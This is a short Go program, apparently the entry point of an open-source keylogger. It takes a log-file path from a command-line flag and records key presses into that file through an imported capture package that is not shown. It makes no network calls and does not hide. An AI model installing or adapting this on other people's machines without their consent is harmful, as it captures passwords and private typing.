package main

import (
	"bufio"
	"flag"
	"os"

	"github.com/nomad-software/keylogger/input"
	"github.com/nomad-software/keylogger/output"
)

func main() {
	logFile := flag.String("log", "", "The destination log file for key presses.")
	flag.Parse()

	if *logFile == "" {
		flag.Usage()
		output.Fatal("No log file specified")
	}

	file, err := os.OpenFile(*logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		output.OnError(err, "cannot open log")
	}

	// Add a small buffer so it's not thrashing the disk!
	w := bufio.NewWriterSize(file, 16)
	defer w.Flush()

	input.LogKeysTo(w)
}
